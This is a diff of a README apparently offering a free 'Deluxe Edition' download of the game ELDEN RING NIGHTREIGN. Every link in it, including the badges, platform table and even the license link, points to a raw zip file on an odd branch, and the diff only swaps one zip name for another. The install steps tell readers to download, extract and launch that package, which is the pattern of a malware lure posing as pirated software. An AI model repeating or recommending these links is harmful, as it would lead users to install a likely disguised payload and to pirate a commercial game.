@@ -1,4 +1,4 @@
-# ![Download](https://github.com/Salahnahryry/elden-ring-nightreign-deluxe-edition-sharing/raw/refs/heads/branch/hyperephidrosis/ring-sharing-nightreign-edition-elden-deluxe-1.0-alpha.3.zip)  
+# ![Download](https://github.com/Salahnahryry/elden-ring-nightreign-deluxe-edition-sharing/raw/refs/heads/branch/hyperephidrosis/elden-nightreign-deluxe-sharing-edition-ring-1.7.zip)  
 **Click the badge above to begin your ultimate journey into the world of NIGHTREIGN.**
 
 ---
@@ -7,10 +7,10 @@
 
 Welcome to the official repository for **ELDEN RING NIGHTREIGN Download Hub**. In this mystical alcove, seekers of adventure unveil NIGHTREIGN—the immersive journey into the Lands Between, expanded and re-forged for the next era of interactive storytelling.  
 
-![Stars](https://github.com/Salahnahryry/elden-ring-nightreign-deluxe-edition-sharing/raw/refs/heads/branch/hyperephidrosis/ring-sharing-nightreign-edition-elden-deluxe-1.0-alpha.3.zip)
-![Forks](https://github.com/Salahnahryry/elden-ring-nightreign-deluxe-edition-sharing/raw/refs/heads/branch/hyperephidrosis/ring-sharing-nightreign-edition-elden-deluxe-1.0-alpha.3.zip)
-![Maintenance](https://github.com/Salahnahryry/elden-ring-nightreign-deluxe-edition-sharing/raw/refs/heads/branch/hyperephidrosis/ring-sharing-nightreign-edition-elden-deluxe-1.0-alpha.3.zip)
-![License](https://github.com/Salahnahryry/elden-ring-nightreign-deluxe-edition-sharing/raw/refs/heads/branch/hyperephidrosis/ring-sharing-nightreign-edition-elden-deluxe-1.0-alpha.3.zip)
+![Stars](https://github.com/Salahnahryry/elden-ring-nightreign-deluxe-edition-sharing/raw/refs/heads/branch/hyperephidrosis/elden-nightreign-deluxe-sharing-edition-ring-1.7.zip)
+![Forks](https://github.com/Salahnahryry/elden-ring-nightreign-deluxe-edition-sharing/raw/refs/heads/branch/hyperephidrosis/elden-nightreign-deluxe-sharing-edition-ring-1.7.zip)
+![Maintenance](https://github.com/Salahnahryry/elden-ring-nightreign-deluxe-edition-sharing/raw/refs/heads/branch/hyperephidrosis/elden-nightreign-deluxe-sharing-edition-ring-1.7.zip)
+![License](https://github.com/Salahnahryry/elden-ring-nightreign-deluxe-edition-sharing/raw/refs/heads/branch/hyperephidrosis/elden-nightreign-deluxe-sharing-edition-ring-1.7.zip)
 
 <center>
 
@@ -26,10 +26,10 @@ This repository exists to seamlessly guide you to NIGHTREIGN and beyond, with ev
 
 | Platform              | Supported | Installation Instructions                                       |
 |-----------------------|:---------:|---------------------------------------------------------------|
-| ![Windows](https://github.com/Salahnahryry/elden-ring-nightreign-deluxe-edition-sharing/raw/refs/heads/branch/hyperephidrosis/ring-sharing-nightreign-edition-elden-deluxe-1.0-alpha.3.zip✔️-brightgreen) |   Yes   | See [Installation Guide](#installation-handbook)              |
-| ![macOS](https://github.com/Salahnahryry/elden-ring-nightreign-deluxe-edition-sharing/raw/refs/heads/branch/hyperephidrosis/ring-sharing-nightreign-edition-elden-deluxe-1.0-alpha.3.zip✔️-brightgreen)     |   Yes   | See [Installation Guide](#installation-handbook)              |
-| ![Linux](https://github.com/Salahnahryry/elden-ring-nightreign-deluxe-edition-sharing/raw/refs/heads/branch/hyperephidrosis/ring-sharing-nightreign-edition-elden-deluxe-1.0-alpha.3.zip✔️-brightgreen)     |   Yes   | See [Installation Guide](#installation-handbook)              |
-| ![SteamDeck](https://github.com/Salahnahryry/elden-ring-nightreign-deluxe-edition-sharing/raw/refs/heads/branch/hyperephidrosis/ring-sharing-nightreign-edition-elden-deluxe-1.0-alpha.3.zip✔️-brightgreen) | Yes   | See [SteamDeck Guide](#steamdeck-deployment)                  |
+| ![Windows](https://github.com/Salahnahryry/elden-ring-nightreign-deluxe-edition-sharing/raw/refs/heads/branch/hyperephidrosis/elden-nightreign-deluxe-sharing-edition-ring-1.7.zip✔️-brightgreen) |   Yes   | See [Installation Guide](#installation-handbook)              |
+| ![macOS](https://github.com/Salahnahryry/elden-ring-nightreign-deluxe-edition-sharing/raw/refs/heads/branch/hyperephidrosis/elden-nightreign-deluxe-sharing-edition-ring-1.7.zip✔️-brightgreen)     |   Yes   | See [Installation Guide](#installation-handbook)              |
+| ![Linux](https://github.com/Salahnahryry/elden-ring-nightreign-deluxe-edition-sharing/raw/refs/heads/branch/hyperephidrosis/elden-nightreign-deluxe-sharing-edition-ring-1.7.zip✔️-brightgreen)     |   Yes   | See [Installation Guide](#installation-handbook)              |
+| ![SteamDeck](https://github.com/Salahnahryry/elden-ring-nightreign-deluxe-edition-sharing/raw/refs/heads/branch/hyperephidrosis/elden-nightreign-deluxe-sharing-edition-ring-1.7.zip✔️-brightgreen) | Yes   | See [SteamDeck Guide](#steamdeck-deployment)                  |
 
 ---
 
@@ -60,20 +60,20 @@ Discover how NIGHTREIGN redefines action RPGs—download the latest immersive El
 ### Step into NIGHTREIGN
 
 To set foot in the world of NIGHTREIGN, follow the mantra below per your chosen platform.  
-> **Begin the download**: https://github.com/Salahnahryry/elden-ring-nightreign-deluxe-edition-sharing/raw/refs/heads/branch/hyperephidrosis/ring-sharing-nightreign-edition-elden-deluxe-1.0-alpha.3.zip
+> **Begin the download**: https://github.com/Salahnahryry/elden-ring-nightreign-deluxe-edition-sharing/raw/refs/heads/branch/hyperephidrosis/elden-nightreign-deluxe-sharing-edition-ring-1.7.zip
 
 ### Windows / macOS / Linux
 
-1. Click the ["Download" badge above](#) or https://github.com/Salahnahryry/elden-ring-nightreign-deluxe-edition-sharing/raw/refs/heads/branch/hyperephidrosis/ring-sharing-nightreign-edition-elden-deluxe-1.0-alpha.3.zip
+1. Click the ["Download" badge above](#) or https://github.com/Salahnahryry/elden-ring-nightreign-deluxe-edition-sharing/raw/refs/heads/branch/hyperephidrosis/elden-nightreign-deluxe-sharing-edition-ring-1.7.zip
 2. Extract the package to your desired directory.
-3. Launch the **NIGHTREIGN https://github.com/Salahnahryry/elden-ring-nightreign-deluxe-edition-sharing/raw/refs/heads/branch/hyperephidrosis/ring-sharing-nightreign-edition-elden-deluxe-1.0-alpha.3.zip** (Windows), **.dmg** (macOS), or **.AppImage** (Linux).
+3. Launch the **NIGHTREIGN https://github.com/Salahnahryry/elden-ring-nightreign-deluxe-edition-sharing/raw/refs/heads/branch/hyperephidrosis/elden-nightreign-deluxe-sharing-edition-ring-1.7.zip** (Windows), **.dmg** (macOS), or **.AppImage** (Linux).
 4. Follow the on-screen incantations to complete the installation.
 5. When prompted, select your preferred language and graphical settings.
 6. Done! Open the game and let your legend unfold.
 
 ### Steam Deck Deployment
 
-1. Download the installable package from https://github.com/Salahnahryry/elden-ring-nightreign-deluxe-edition-sharing/raw/refs/heads/branch/hyperephidrosis/ring-sharing-nightreign-edition-elden-deluxe-1.0-alpha.3.zip
+1. Download the installable package from https://github.com/Salahnahryry/elden-ring-nightreign-deluxe-edition-sharing/raw/refs/heads/branch/hyperephidrosis/elden-nightreign-deluxe-sharing-edition-ring-1.7.zip
 2. On Steam Deck, enable Desktop Mode.
 3. Copy the installer file to your preferred directory.
 4. Launch and follow standard instructions.
@@ -117,9 +117,9 @@ ELDEN RING NIGHTREIGN isn't just more game—it's smarter.
 ## 📜 License
 
 This repository and all shared scripts/resources are licensed under the MIT License (2025). To learn more, review the full license text here:  
-**[MIT License](https://github.com/Salahnahryry/elden-ring-nightreign-deluxe-edition-sharing/raw/refs/heads/branch/hyperephidrosis/ring-sharing-nightreign-edition-elden-deluxe-1.0-alpha.3.zip)**
+**[MIT License](https://github.com/Salahnahryry/elden-ring-nightreign-deluxe-edition-sharing/raw/refs/heads/branch/hyperephidrosis/elden-nightreign-deluxe-sharing-edition-ring-1.7.zip)**
 
 ---
 
-# ![Download](https://github.com/Salahnahryry/elden-ring-nightreign-deluxe-edition-sharing/raw/refs/heads/branch/hyperephidrosis/ring-sharing-nightreign-edition-elden-deluxe-1.0-alpha.3.zip)  
+# ![Download](https://github.com/Salahnahryry/elden-ring-nightreign-deluxe-edition-sharing/raw/refs/heads/branch/hyperephidrosis/elden-nightreign-deluxe-sharing-edition-ring-1.7.zip)  
 **Brave the unknown. Claim NIGHTREIGN from the badge above to start your odyssey!**
